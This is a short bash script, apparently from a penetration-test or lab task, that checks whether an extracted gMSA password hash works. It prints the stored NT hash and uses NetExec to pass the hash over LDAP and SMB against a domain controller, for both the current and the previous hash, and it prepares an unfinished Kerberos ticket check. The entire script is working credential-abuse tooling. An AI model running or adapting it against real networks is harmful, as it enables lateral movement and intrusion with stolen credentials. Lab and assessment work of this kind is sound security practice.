#!/bin/bash
# T024 validation — gMSA password extraction + auth validation as eng_cloud (ACE#10)
set -u
export PATH=/usr/local/bin:/usr/bin:/bin
NXC=/tmp/nxc-venv/bin/nxc
cd /tmp

NT=$(cat /tmp/gmsa-nt.txt 2>/dev/null)
echo "=== gMSA NT hash ==="
echo "NT=$NT"

echo "=== nxc ldap auth as gmsaTools\$ (current hash) ==="
$NXC ldap 192.168.77.10 -d cadre.local -u 'gmsaTools$' -H "$NT" 2>&1 | tail -3

echo "=== nxc smb auth as gmsaTools\$ (current hash) ==="
$NXC smb 192.168.77.10 -d cadre.local -u 'gmsaTools$' -H "$NT" 2>&1 | tail -3

NTP=$(cat /tmp/gmsa-nt-prev.txt 2>/dev/null)
if [ -n "$NTP" ]; then
  echo "=== nxc ldap auth as gmsaTools\$ (previous hash) ==="
  $NXC ldap 192.168.77.10 -d cadre.local -u 'gmsaTools$' -H "$NTP" 2>&1 | tail -3
fi

echo "=== cross-check via getTGT with NT hash (Kerberos) ==="
export KRB5_CONFIG=/tmp/krb5-cadre.conf 2>/dev/null || true
echo "T024_VALIDATION_DONE"
